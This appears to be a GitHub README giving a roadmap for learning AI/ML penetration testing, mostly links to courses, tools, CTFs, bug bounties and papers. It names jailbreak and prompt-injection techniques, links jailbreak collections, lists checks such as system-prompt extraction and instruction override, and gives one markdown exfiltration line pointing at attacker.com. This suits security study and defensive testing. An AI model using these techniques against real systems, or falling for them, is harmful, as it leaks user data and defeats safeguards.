# 🛡️ AI/ML Pentesting Roadmap

![output](https://github.com/user-attachments/assets/ca866203-8e57-4063-9d63-4ac919ed7b07)

> A comprehensive, structured guide to learning AI/ML security and penetration testing — from zero to practitioner.

---

## 📋 Table of Contents

1. [Prerequisites](#prerequisites)
2. [Phase 1 — Foundations](#phase-1--foundations)
3. [Phase 2 — AI/ML Security Concepts](#phase-2--aiml-security-concepts)
4. [Phase 3 — Prompt Injection & LLM Attacks](#phase-3--prompt-injection--llm-attacks)
5. [Phase 4 — Hands-On Practice](#phase-4--hands-on-practice)
6. [Phase 5 — Advanced Exploitation Techniques](#phase-5--advanced-exploitation-techniques)
7. [Phase 6 — Real-World Research & Bug Bounty](#phase-6--real-world-research--bug-bounty)
8. [Standards, Frameworks & References](#standards-frameworks--references)
9. [Tools & Repositories](#tools--repositories)
10. [Books, PDFs & E-Books](#books-pdfs--e-books)
11. [Video Resources](#video-resources)
12. [CTF & Competitions](#ctf--competitions)
13. [Bug Bounty Programs](#bug-bounty-programs)
14. [Community & News](#community--news)
15. [Suggested Learning Path by Experience Level](#suggested-learning-path-by-experience-level)

---

## Prerequisites

Before diving into AI/ML pentesting, ensure you have the following foundation:

### General Security Basics
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free, hands-on web security training (XSS, SQLi, SSRF, etc.)
- [TryHackMe — Pre-Security Path](https://tryhackme.com/path/outline/presecurity)
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Programming (Python is essential)
- [Python for Everybody — Coursera](https://www.coursera.org/specializations/python)
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/) — Free online book
- [CS50P — Python](https://cs50.harvard.edu/python/) — Free Harvard course

### APIs & HTTP
- Understand REST APIs, HTTP methods, headers, and authentication flows
- [Postman Learning Center](https://learning.postman.com/)
- Practice with tools: `curl`, `Burp Suite`, `Postman`

---

## Phase 1 — Foundations

### 1.1 Machine Learning Fundamentals

| Resource | Type | Cost |
|---|---|---|
| [Machine Learning — Andrew Ng (Coursera)](https://www.coursera.org/learn/machine-learning) | Course | Audit Free |
| [Introduction to ML — edX](https://www.edx.org/course/introduction-to-machine-learning) | Course | Audit Free |
| [fast.ai Practical Deep Learning](https://course.fast.ai/) | Course | Free |
| [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course) | Course | Free |
| [Kaggle ML Courses](https://www.kaggle.com/learn) | Course | Free |
| [3Blue1Brown — Neural Networks](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) | Video | Free |

### 1.2 Large Language Models (LLMs)

Understanding how LLMs work is critical before attacking them.

| Resource | Type | Cost |
|---|---|---|
| [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g) | Video | Free |
| [Andrej Karpathy — Let's build GPT](https://www.youtube.com/watch?v=kCc8FmEb1nY) | Video | Free |
| [Hugging Face NLP Course](https://huggingface.co/learn/nlp-course) | Course | Free |
| [LLM University by Cohere](https://llmu.cohere.com/) | Course | Free |
| [Prompt Engineering Guide](https://www.promptingguide.ai/) | Guide | Free |

---

## Phase 2 — AI/ML Security Concepts

### 2.1 Core Security Concepts

- [OWASP LLM Top 10](https://genai.owasp.org/) — The definitive OWASP list for LLM vulnerabilities
- [MITRE ATLAS Matrix](https://atlas.mitre.org/matrices/ATLAS/) — Adversarial Tactics, Techniques, and Common Knowledge for AI systems
- [NIST AI Risk Management Framework](https://airc.nist.gov/Home) — Federal AI risk guidance
- [IBM — AI Security Overview](https://www.ibm.com/topics/ai-security)
- [AI Village — LLM Threat Modeling](https://aivillage.org/large%20language%20models/threat-modeling-llm/)
- [Promptingguide — Adversarial Attacks](https://www.promptingguide.ai/risks/adversarial)
- [HackerOne — Ultimate Guide to Managing Ethical and Security Risks in AI](https://www.hackerone.com/resources/e-book/the-ultimate-guide-to-managing-ethical-and-security-risks-in-ai)

### 2.2 Attack Surface Overview

Key attack vectors in AI/ML systems:

- **Prompt Injection** — Manipulating LLM behavior through crafted inputs
- **Jailbreaking** — Bypassing safety filters and guardrails
- **Model Inversion** — Extracting training data from a model
- **Membership Inference** — Determining if data was in training set
- **Data Poisoning** — Corrupting training data to influence behavior
- **Adversarial Examples** — Perturbed inputs that fool classifiers
- **Model Extraction/Stealing** — Cloning a model via API queries
- **Supply Chain Attacks** — Malicious models/weights on platforms like Hugging Face
- **Insecure Plugin/Tool Integration** — Exploiting LLM agents with external tools
- **Training Data Exfiltration** — Extracting memorized private data
- **Denial of Service** — Overloading models via crafted prompts

### 2.3 MLOps & Infrastructure Security

- [From MLOps to MLOops — JFrog](https://jfrog.com/blog/from-mlops-to-mloops-exposing-the-attack-surface-of-machine-learning-platforms/)
- [Offensive ML Playbook](https://wiki.offsecml.com/Welcome+to+the+Offensive+ML+Playbook)
- [AI Exploits — ProtectAI](https://github.com/protectai/ai-exploits)
- [Awesome AI Security — ottosulin](https://github.com/ottosulin/awesome-ai-security)

---

## Phase 3 — Prompt Injection & LLM Attacks

### 3.1 Understanding Prompt Injection

- [IBM Guide on Prompt Injection](https://www.ibm.com/topics/prompt-injection)
- [Simon Willison's Explanation of Prompt Injection](https://simonwillison.net/2023/May/2/prompt-injection-explained/)
- [Learn Prompting — Prompt Hacking and Injection](https://learnprompting.org/docs/prompt_hacking/injection)
- [PortSwigger LLM Attacks](https://portswigger.net/web-security/llm-attacks)
- [NCC Group — Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/)
- [Bugcrowd — AI Vulnerability Deep Dive: Prompt Injection](https://www.bugcrowd.com/blog/ai-vulnerability-deep-dive-prompt-injection/)

### 3.2 Jailbreaking Techniques

- **DAN (Do Anything Now)** — Classic jailbreak technique: [Chatgpt-DAN Repo](https://github.com/alexisvalentino/Chatgpt-DAN)
- **Role-playing / Persona manipulation**
- **Token smuggling** — Encoding instructions to bypass filters
- **Prompt leaking** — Extracting system prompts
- **Indirect prompt injection** — Attacks via documents, web content, memory
- [WideOpenAI — Jailbreak Collection](https://github.com/WibblyOWobbly/WideOpenAI)
- [PayloadsAllTheThings — Prompt Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/)
- [PALLMs — Payloads for Attacking LLMs](https://github.com/mik0w/pallms/)

### 3.3 Indirect Prompt Injection

A more sophisticated attack where malicious instructions are injected via external data sources (emails, documents, websites) that an LLM agent processes.

- [Greshake — LLM Security / Not What You've Signed Up For](https://github.com/greshake/llm-security)
- [Embrace The Red — Blog](https://embracethered.com/blog/) — Comprehensive blog covering real-world indirect injection
- [GitHub Copilot Chat: Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)
- [Google AI Studio Data Exfiltration](https://embracethered.com/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/)

### 3.4 Advanced Prompt Attack Techniques

- [How to Persuade an LLM to Change Its System Prompt](https://medium.com/@KonradDaWo/how-to-persuade-a-llm-to-change-its-system-prompt-to-aid-in-ctf-challenges-e74c1d570ed3)
- [Bugcrowd Ultimate Guide to AI Security (PDF)](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf)
- [Snyk OWASP Top 10 LLM (PDF)](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf)
- [Vanna.AI Prompt Injection RCE — JFrog](https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/)

---

## Phase 4 — Hands-On Practice

### 4.1 Interactive Platforms & Games

| Platform | Description | Link |
|---|---|---|
| Gandalf | LLM prompt testing game — extract the password | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| Prompt Airlines | Gamified prompt injection learning | [promptairlines.com](https://promptairlines.com/) |
| Crucible | Interactive AI security challenges by Dreadnode | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| Immersive Labs AI | Structured AI security exercises | [prompting.ai.immersivelabs.com](https://prompting.ai.immersivelabs.com/) |
| Secdim AI Games | Prompt injection games | [play.secdim.com/game/ai](https://play.secdim.com/game/ai) |
| HackAPrompt | Community prompt injection competition | [hackaprompt.com](https://www.hackaprompt.com/) |
| PortSwigger LLM Labs | Hands-on web LLM attack labs | [Web Security Academy](https://portswigger.net/web-security/llm-attacks) |

### 4.2 Vulnerable-by-Design Projects

| Repository | Description |
|---|---|
| [Damn Vulnerable LLM Agent — WithSecureLabs](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent) | Intentionally vulnerable LLM agent |
| [ScottLogic Prompt Injection Playground](https://github.com/ScottLogic/prompt-injection) | Local prompt injection lab |
| [Greshake LLM Security Tools](https://github.com/greshake/llm-security) | Proof-of-concept attacks |

### 4.3 CTF Writeups to Study

- [CTF Writeup — HackPack CTF 2024 LLM Edition](https://medium.com/@embossdotar/ctf-writeup-hackpack-ctf-2024-llm-edition-yellowdog-1-db02a36e1051)
- [LLM Pentest Writeups — System Weakness](https://systemweakness.com/large-language-model-llm-pen-testing-part-i-2ef96acb6763)

---

## Phase 5 — Advanced Exploitation Techniques

### 5.1 Agent & Tool Integration Attacks

When LLMs are integrated with tools (code execution, web browsing, file systems), the attack surface expands dramatically.

- [LLM Pentest: Leveraging Agent Integration for RCE — BlazeInfoSec](https://www.blazeinfosec.com/post/llm-pentest-agent-hacking/)
- [LLM Pentest: Leveraging Agent Integration For RCE (full)](https://www.blazeinfosec.com/post/llm-pentest-agent-hacking/)
- [Dumping a Database with an AI Chatbot — Synack](https://www.synack.com/blog/dumping-a-database-with-an-ai-chatbot/)
- [CSWSH Meets LLM Chatbots](https://medium.com/@r3vsh/cswsh-meets-llm-chatbots-3ab09af5ab6f)

### 5.2 Data Exfiltration via LLMs

- [Google AI Studio: LLM-Powered Data Exfiltration](https://embracethered.com/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/)
- [Google AI Studio Mass Data Exfil (Regression)](https://embracethered.com/blog/posts/2024/google-aistudio-mass-data-exfil/)
- [Hacking Google Bard — From Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)
- [AWS Amazon Q Markdown Rendering Vulnerability](https://embracethered.com/blog/posts/2024/aws-amazon-q-fixes-markdown-rendering-vulnerability/)
- [GitHub Copilot Chat Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)

### 5.3 Account Takeover & Authentication Attacks

- [ChatGPT Account Takeover — Wildcard Web Cache Deception](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)
- [Shockwave — Critical ChatGPT Vulnerability (Web Cache Deception)](https://www.shockwave.cloud/blog/shockwave-works-with-openai-to-fix-critical-chatgpt-vulnerability)
- [Security Flaws in ChatGPT Ecosystem — Salt Security](https://salt.security/blog/security-flaws-within-chatgpt-extensions-allowed-access-to-accounts-on-third-party-websites-and-sensitive-data)
- [OpenAI Allowed Unlimited Credit on New Accounts — Checkmarx](https://checkmarx.com/blog/openai-allowed-unlimited-credit-on-new-accounts/)

### 5.4 XSS & Web Vulnerabilities in AI Products

- [XSS Marks the Spot: Digging Up Vulnerabilities in ChatGPT — Imperva](https://www.imperva.com/blog/xss-marks-the-spot-digging-up-vulnerabilities-in-chatgpt/)
- [Zeroday on GitHub Copilot](https://gccybermonks.com/posts/github/)

### 5.5 Model & Infrastructure Attacks

- [Shelltorch Explained: Multiple Vulnerabilities in TorchServe (CVSS 9.9)](https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server)
- [From ChatBot to SpyBot: ChatGPT Post-Exploitation — Imperva](https://www.imperva.com/blog/from-chatbot-to-spybot-chatgpt-post-exploitation/)

### 5.6 Persistent Attacks & Memory Exploitation

- [ChatGPT Persistent Denial of Service via Memory Attacks — Embrace the Red](https://embracethered.com/blog/posts/2024/chatgpt-persistent-denial-of-service/)

### 5.7 Adversarial Machine Learning

- [CleverHans Library](https://github.com/cleverhans-lab/cleverhans) — Adversarial example library
- [ART (Adversarial Robustness Toolbox) — IBM](https://github.com/Trusted-AI/adversarial-robustness-toolbox)
- [Foolbox](https://github.com/bethgelab/foolbox) — Python toolbox for adversarial attacks

---

## Phase 6 — Real-World Research & Bug Bounty

### 6.1 Notable Research & Disclosures

- [We Hacked Google AI for $50,000 — LandH](https://www.landh.tech/blog/20240304-google-hack-50000/)
- [New Google Gemini Content Manipulation Vulnerabilities — HiddenLayer](https://hiddenlayer.com/research/new-google-gemini-content-manipulation-vulns-found/#Overview)
- [Jailbreak of Meta AI (Llama 3.1) Revealing Config Details](https://medium.com/@kiranmaraju/jailbreak-of-meta-ai-llama-3-1-revealing-configuration-details-9f0759f5006a)
- [Bypass Instructions to Manipulate Google Bard](https://medium.com/@kiranmaraju/bypass-instructions-to-manipulate-google-bard-ai-conversational-generative-ai-chatbot-to-reveal-ac23156d5eee)
- [My LLM Bug Bounty Journey on Hugging Face Hub](https://medium.com/@zpbrent/my-llm-bug-bounty-journey-on-hugging-face-hub-via-protect-ai-9f3a1bc72c2e)
- [Anonymised Penetration Test Report — Volkis](https://handbook.volkis.com.au/assets/doc/Volkis%20-%20Anonymous%20Client%20-%20Penetration%20Test%20May%202023.pdf)
- [Lakera Real World LLM Exploits (PDF)](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf)

### 6.2 How to Find LLM Vulnerabilities

Key areas to test when assessing an LLM-powered application:

1. **System prompt extraction** — Can you leak the hidden system prompt?
2. **Instruction override** — Can you ignore system-level instructions?
3. **Plugin/tool abuse** — Can agent tools be misused (SSRF, RCE, SQLi)?
4. **Data exfiltration via markdown** — Does the UI render `![](https://attacker.com?q=...)` ?
5. **Persistent injection via memory** — Can you inject instructions that persist in memory/RAG?
6. **PII leakage** — Does the model reveal training data or other users' data?
7. **Cross-user data leakage** — In multi-tenant apps, can you access other users' contexts?
8. **Authentication bypass** — Can you trick the LLM into performing privileged actions?

---

## Standards, Frameworks & References

| Resource | Description |
|---|---|
| [OWASP LLM Top 10](https://genai.owasp.org/) | Top 10 LLM vulnerability classes |
| [MITRE ATLAS](https://atlas.mitre.org/matrices/ATLAS/) | AI adversarial threat matrix |
| [NIST AI RMF](https://airc.nist.gov/Home) | US Federal AI risk management framework |
| [OWASP AI Exchange](https://owaspai.org/) | Cross-industry AI security guidance |
| [ISO/IEC 42001](https://www.iso.org/standard/81230.html) | International AI management standard |
| [ENISA AI Threat Landscape](https://www.enisa.europa.eu/publications/enisa-threat-landscape-for-artificial-intelligence) | EU AI threat landscape report |
| [Google Secure AI Framework (SAIF)](https://safety.google/cybersecurity-advancements/saif/) | Google's AI security framework |

---

## Tools & Repositories

### Offensive Tools

| Tool | Purpose |
|---|---|
| [Garak](https://github.com/leondz/garak) | LLM vulnerability scanner |
| [PyRIT](https://github.com/Azure/PyRIT) | Microsoft's Python Risk Identification Toolkit for LLMs |
| [LLM Fuzzer](https://github.com/mnns/LLMFuzzer) | Fuzzing framework for LLMs |
| [PALLMs](https://github.com/mik0w/pallms/) | Payloads for attacking LLMs |
| [PromptInject](https://github.com/agencyenterprise/PromptInject) | Prompt injection attack framework |
| [PurpleLlama / CyberSecEval](https://github.com/facebookresearch/PurpleLlama) | Meta's LLM security evaluation |
| [LLM Injector](https://github.com/anmolksachan/LLMInjector) | LLM Injector Burp Suite Extention |

### Defensive / Scanning Tools

| Tool | Purpose |
|---|---|
| [Rebuff](https://github.com/protectai/rebuff) | Prompt injection detection |
| [NeMo Guardrails](https://github.com/NVIDIA/NeMo-Guardrails) | NVIDIA guardrail framework |
| [Lakera Guard](https://www.lakera.ai/) | Commercial prompt injection protection |
| [AI Exploits — ProtectAI](https://github.com/protectai/ai-exploits) | Real-world ML exploit collection |
| [ModelScan](https://github.com/protectai/modelscan) | Scan ML model files for malicious code |

### Reference Lists

| Resource | Description |
|---|---|
| [Awesome LLM Security — corca-ai](https://github.com/corca-ai/awesome-llm-security) | Curated LLM security list |
| [Awesome LLM — Hannibal046](https://github.com/Hannibal046/Awesome-LLM) | Everything LLM including security |
| [Awesome AI Security — ottosulin](https://github.com/ottosulin/awesome-ai-security) | General AI security resources |
| [LLM Hacker's Handbook](https://github.com/forcesunseen/llm-hackers-handbook) | Comprehensive hacking handbook |
| [PayloadsAllTheThings — Prompt Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/) | Payload collection |
| [WideOpenAI](https://github.com/WibblyOWobbly/WideOpenAI) | Jailbreak and bypass collection |
| [Chatgpt-DAN](https://github.com/alexisvalentino/Chatgpt-DAN) | DAN jailbreak collection |

---

## Books, PDFs & E-Books

| Resource | Link |
|---|---|
| LLM Hacker's Handbook | [GitHub](https://github.com/forcesunseen/llm-hackers-handbook) |
| OWASP Top 10 for LLM (Snyk) | [PDF](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf) |
| Bugcrowd Ultimate Guide to AI Security | [PDF](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf) |
| Lakera Real World LLM Exploits | [PDF](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf) |
| HackerOne Ultimate Guide to Managing AI Risks | [E-Book](https://www.hackerone.com/resources/e-book/the-ultimate-guide-to-managing-ethical-and-security-risks-in-ai) |
| Adversarial Machine Learning — Goodfellow et al. | [arXiv](https://arxiv.org/abs/1412.6572) |

---

## Video Resources

| Resource | Link |
|---|---|
| Penetration Testing Against and With AI/LLM/ML (Playlist) | [YouTube](https://www.youtube.com/playlist?list=PL1Aj7oPl6slsd3Er7PfeOIEFYPDQvMRUf) |
| Andrej Karpathy — Intro to Large Language Models | [YouTube](https://www.youtube.com/watch?v=zjkBMFhNj_g) |
| DEF CON AI Village Talks | [YouTube](https://www.youtube.com/@AIVillage) |
| LiveOverflow — AI/ML Security | [YouTube](https://www.youtube.com/@LiveOverflow) |
| 3Blue1Brown — Neural Networks Series | [YouTube](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) |
| John Hammond — AI Security Challenges | [YouTube](https://www.youtube.com/@_JohnHammond) |
| Cybrary — Machine Learning Security | [Cybrary](https://www.cybrary.it/course/machine-learning-security/) |

---

## CTF & Competitions

| Competition | Description | Link |
|---|---|---|
| Crucible | Ongoing AI security challenges | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| HackAPrompt | Annual prompt injection competition | [hackaprompt.com](https://www.hackaprompt.com/) |
| AI Village CTF (DEF CON) | Annual AI security CTF at DEF CON | [aivillage.org](https://aivillage.org/) |
| Gandalf | Self-paced LLM challenge | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| Prompt Airlines | Gamified injection challenges | [promptairlines.com](https://promptairlines.com/) |
| Hack The Box AI Challenges | HTB AI-themed challenges | [hackthebox.com](https://www.hackthebox.com/) |
| Secdim AI Games | Web-based AI security games | [play.secdim.com/game/ai](https://play.secdim.com/game/ai) |

---

## Bug Bounty Programs

AI/ML security bug bounties are growing rapidly. Target these platforms:

| Program | Scope | Link |
|---|---|---|
| OpenAI Bug Bounty | ChatGPT, API, plugins | [bugcrowd.com/openai](https://bugcrowd.com/openai) |
| Google AI Bug Bounty | Gemini, Bard, Vertex AI | [bughunters.google.com](https://bughunters.google.com/) |
| Meta AI Bug Bounty | Llama models, Meta AI | [facebook.com/whitehat](https://www.facebook.com/whitehat) |
| HuggingFace via ProtectAI | Hub, models, spaces | [huntr.com](https://huntr.com/) |
| Anthropic Bug Bounty | Claude, API | [anthropic.com/security](https://www.anthropic.com/security) |
| Microsoft (Copilot, Azure AI) | Copilot, Azure OpenAI | [msrc.microsoft.com](https://msrc.microsoft.com/create-report) |
| Huntr (AI/ML focused) | Open source ML libraries | [huntr.com](https://huntr.com/) |

**Tips for AI bug bounty:**
- Focus on **data exfiltration via markdown rendering** (common finding)
- Test **plugin/tool integrations** thoroughly
- Look for **prompt injection in RAG pipelines**
- Explore **memory and persistent context manipulation**
- Check for **cross-tenant data leakage** in multi-user deployments

---

## Community & News

### Communities

- [AI Village](https://aivillage.org/) — DEF CON's AI security community
- [OWASP AI Exchange](https://owaspai.org/) — Open standard for AI security
- [ProtectAI](https://protectai.com/) — AI security research and tools
- [Embrace the Red — Blog](https://embracethered.com/blog/) — Leading blog on LLM security
- [Kai Greshake's Research](https://kai-greshake.de/) — Indirect prompt injection research

### Newsletters & Blogs

- [The Batch — DeepLearning.AI](https://www.deeplearning.ai/the-batch/) — Weekly AI news
- [Simon Willison's Weblog](https://simonwillison.net/) — Authoritative LLM security commentary
- [HiddenLayer Research](https://hiddenlayer.com/research/) — AI security research
- [Lakera Blog](https://www.lakera.ai/blog) — LLM security insights
- [PortSwigger Research](https://portswigger.net/research) — Web + AI security research

---

## Suggested Learning Path by Experience Level

### 🟢 Beginner (0–3 months)

1. Complete [PortSwigger Web Security Academy](https://portswigger.net/web-security) fundamentals
2. Learn Python basics
3. Take [Google ML Crash Course](https://developers.google.com/machine-learning/crash-course)
4. Read [OWASP LLM Top 10](https://genai.owasp.org/)
5. Play [Gandalf](https://gandalf.lakera.ai/) — all levels
6. Read [Simon Willison's prompt injection article](https://simonwillison.net/2023/May/2/prompt-injection-explained/)
7. Watch [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g)

### 🟡 Intermediate (3–9 months)

1. Study [MITRE ATLAS Matrix](https://atlas.mitre.org/matrices/ATLAS/)
2. Complete [PortSwigger LLM Attack labs](https://portswigger.net/web-security/llm-attacks)
3. Set up and exploit [Damn Vulnerable LLM Agent](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent)
4. Complete [Prompt Airlines](https://promptairlines.com/) and [Crucible](https://crucible.dreadnode.io/) challenges
5. Read the [LLM Hacker's Handbook](https://github.com/forcesunseen/llm-hackers-handbook)
6. Study the [Embrace the Red blog](https://embracethered.com/blog/) in full
7. Experiment with [Garak](https://github.com/leondz/garak) and [PyRIT](https://github.com/Azure/PyRIT)
8. Try [Offensive ML Playbook](https://wiki.offsecml.com/Welcome+to+the+Offensive+ML+Playbook)

### 🔴 Advanced (9+ months)

1. Participate in [AI Village CTF at DEF CON](https://aivillage.org/)
2. Submit findings to [Huntr](https://huntr.com/) or [OpenAI Bug Bounty](https://bugcrowd.com/openai)
3. Study adversarial ML with [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox) and [CleverHans](https://github.com/cleverhans-lab/cleverhans)
4. Read academic papers on model inversion, membership inference, and data extraction
5. Contribute to open source tools like [Garak](https://github.com/leondz/garak) or [AI Exploits](https://github.com/protectai/ai-exploits)
6. Build your own vulnerable LLM demo environment
7. Write and publish research — blog posts, CVEs, conference talks

---

## Key Academic Papers

| Paper | Year |
|---|---|
| [Explaining and Harnessing Adversarial Examples — Goodfellow et al.](https://arxiv.org/abs/1412.6572) | 2014 |
| [Extracting Training Data from Large Language Models — Carlini et al.](https://arxiv.org/abs/2012.07805) | 2021 |
| [Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection — Greshake et al.](https://arxiv.org/abs/2302.12173) | 2023 |
| [Membership Inference Attacks against Machine Learning Models — Shokri et al.](https://arxiv.org/abs/1610.05820) | 2017 |
| [Universal and Transferable Adversarial Attacks on Aligned Language Models — Zou et al.](https://arxiv.org/abs/2307.15043) | 2023 |
| [Jailbroken: How Does LLM Safety Training Fail? — Wei et al.](https://arxiv.org/abs/2307.02483) | 2023 |
| [Prompt Injection attack against LLM-integrated Applications](https://arxiv.org/abs/2306.05499) | 2023 |

---

*Last updated: 2025 | Contributions welcome — submit a PR with new resources.*
